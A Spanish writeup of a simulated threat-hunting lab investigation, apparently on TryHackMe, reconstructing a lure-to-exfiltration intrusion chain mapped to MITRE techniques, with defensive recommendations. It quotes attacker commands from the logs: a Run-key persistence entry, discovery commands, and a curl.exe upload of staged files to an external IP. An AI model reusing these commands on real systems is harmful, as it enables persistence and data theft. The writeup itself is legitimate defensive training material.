# Quiet As The Grave

## Estado

- **Tipo:** Threat Hunting Simulator.
- **Resultado:** investigación exitosa; hipótesis `Proven`.
- **Cadena reconstruida:** 9/9 etapas aceptadas por el simulador.
- **Informe:** generado como `Threat Case Report: NeuralNexus Review Lure —
  Multi-Stage Intrusion at TryHatMe Studios`.
- **Puntuación individual:** 939 puntos en 9 minutos.
- **Estado del leaderboard:** `Passed`; el equipo `hackuaz` quedó con
  `SOC Simulator: Passed`, `TH Simulator: Passed` y 1000 XP.
- **Fecha de trabajo:** 24 de octubre de 2026.

> Este writeup conserva IOCs y evidencia operativa, pero no credenciales ni
> secretos. El script observado contenía valores sensibles hard-coded; se
> omiten deliberadamente.

## Objetivo e hipótesis

La hipótesis de partida indicaba que **Pinstripe Moth** pudo haber comprometido
a una persona desarrolladora mediante un señuelo, usar credenciales válidas y
herramientas legítimas de Windows para alcanzar el material no publicado de
**NeuralNexus**, y posiblemente exfiltrarlo.

La evidencia confirmó la hipótesis: el acceso comenzó con una campaña dirigida
a Sophia Reyes, se estableció persistencia en su equipo, se reutilizó la cuenta
de servicio `svc-studioops`, se alcanzaron otros equipos mediante PowerShell
Remoting y se extrajeron materiales de lanzamiento a un servidor externo.

## Threat intelligence inicial

- **Servidor externo:** `45.147.230.131`.
- **Transporte observado:** HTTPS sobre TCP/8443.
- **Script señalado:** `review-helper.ps1`.
- **Archivo preparado para transferencia:** `review-cache.zip`.
- **Víctima inicial:** Sophia Reyes, equipo `THM-SREYES`.

## Cadena de ataque aceptada

| Etapa | Táctica / técnica | Evidencia principal | Hora observada (UTC) |
|---:|---|---|---|
| 1 | Execution — T1204 User Execution | Sophia Reyes ejecuta el señuelo y `powershell.exe` lanza `review-helper.ps1` | 12:29:48 |
| 2 | Persistence — T1547 Boot or Logon Autostart Execution | Copia local y Run key `NeuralNexusReview` | 12:37:20 |
| 3 | Credential Access — T1552 Unsecured Credentials | `Get-Content`/`ConvertFrom-Json` recuperan credenciales de `svc-studioops` | 13:03:36 |
| 4 | Lateral Movement — T1021 Remote Services | Sesión WinRM hacia `THM-LSULLIVAN`; acceso al inventario denegado | 14:03:36 |
| 5 | Lateral Movement — T1021 Remote Services | Intento WinRM fallido desde `THM-LSULLIVAN` hacia `DC-01` | 16:25:40 |
| 6 | Lateral Movement — T1021 Remote Services | Sesión WinRM hacia `THM-MSMITH` y acceso a `approved-release` | 16:24:50 |
| 7 | Discovery — T1087 Account Discovery | Enumeración de usuarios, administradores, shares y directorios | 16:12:14 |
| 8 | Collection — T1560 Archive Collected Data | `Compress-Archive` genera `review-cache.zip` | 16:27:28 |
| 9 | Exfiltration — T1041 Exfiltration Over C2 Channel | `curl.exe` sube el archivo por HTTPS a `45.147.230.131:8443` | 16:27:54 |

El simulador conserva los hitos en el orden de la cadena aceptada y no en orden
estrictamente cronológico para las etapas intermedias. Las horas anteriores
son las que quedaron asociadas a cada evidencia en el formulario; la propia
evaluación confirmó las tácticas y técnicas anteriores.

## Evidencia SIEM

### Acceso inicial, ejecución y persistencia

El primer equipo afectado fue `THM-SREYES`, bajo el usuario
`TRYHATME\\s.reyes`. El script apareció primero en:

```text
C:\Users\s.reyes\Downloads\NeuralNexusReview\review-helper.ps1
```

Después se ejecutó desde:

```text
C:\Users\s.reyes\AppData\Local\NeuralNexus\review-helper.ps1
```

La persistencia se estableció copiando el script a `%LOCALAPPDATA%` y creando
el valor de usuario:

```text
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
  NeuralNexusReview = powershell.exe -NoProfile -File "...\review-helper.ps1"
```

La correlación se apoyó en eventos Sysmon de creación de archivo y modificación
del registro, además de eventos de PowerShell (`4103`/`4104`) y procesos.

### Credenciales, descubrimiento y movimiento lateral

Los eventos de seguridad `4648` mostraron el uso explícito de
`svc-studioops` desde `THM-SREYES` hacia `THM-LSULLIVAN` y `THM-MSMITH`. La
actividad de reconocimiento incluyó:

```text
whoami
net user /domain
net user
net localgroup Administrators
net share
nltest.exe /dsgetdc:tryhatmestudios.thm
```

El script también abrió sesiones remotas con `New-PSSession` e
`Invoke-Command`. La presencia de `wsmprovhost.exe` fue consistente con
PowerShell Remoting/WinRM. Durante la investigación también se observó acceso
al recurso SMB de `DC-01` (`cifs/DC-01`, puerto 445).

### Colección, archivado y exfiltración

La sesión remota copió los siguientes árboles a un directorio de staging local:

```text
C:\StudioMarketing\approved-release\*
C:\StudioProjects\NeuralNexus\release-notes
%TEMP%\review-staging
```

El archivado quedó reflejado por la operación equivalente a:

```powershell
Compress-Archive -Path "$env:TEMP\review-staging\*" `
  -DestinationPath "$env:TEMP\review-cache.zip"
```

Finalmente, el proceso hijo `curl.exe` utilizó la transferencia HTTPS por el
puerto 8443:

```text
curl.exe --upload-file ...\review-cache.zip https://45.147.230.131:8443/ingest/review-cache.zip
```

No se conserva ningún token, pin de certificado u otro valor secreto del
script. El endpoint y los nombres de archivo son suficientes para documentar
la cadena y generar detecciones defensivas.

## Alcance e impacto

El material afectado fue:

- contenido aprobado de marketing;
- notas de lanzamiento del proyecto NeuralNexus;
- un archivo comprimido listo para transferencia.

Los equipos directamente relacionados con la cadena son `THM-SREYES`,
`THM-LSULLIVAN` y `THM-MSMITH`; `DC-01` apareció en la fase de acceso a recursos
de dominio/SMB. El resultado implica riesgo de robo de propiedad intelectual y
ventaja competitiva para el atacante.

## Recomendaciones de respuesta

1. Aislar `THM-SREYES`, `THM-LSULLIVAN` y `THM-MSMITH`.
2. Deshabilitar y auditar `svc-studioops`; rotar las credenciales relacionadas.
3. Bloquear `45.147.230.131` y revisar salidas HTTPS no habituales por TCP/8443.
4. Eliminar la Run key `NeuralNexusReview` y conservar una copia forense.
5. Revisar sesiones WinRM, eventos 4648, PowerShell 4103/4104 y Sysmon en los
   equipos afectados.
6. Confirmar el alcance de la colección y revisar si existen otras copias del
   archivo `review-cache.zip`.

## Validación en TryHackMe

La línea de tiempo aceptó cada una de las nueve etapas y el informe de amenaza
se generó con la clasificación de exfiltración confirmada. La selección de
`Proven` y el botón `Submit findings` se procesaron correctamente. El resumen
final mostró `Investigation successful: You cracked the case!`, 939 puntos,
94% en técnicas/tácticas, 100% en activos y 88% en IOCs. Tras el procesamiento
asíncrono, el leaderboard confirmó `TH Simulator: Passed` y el equipo quedó
con 1000 XP.
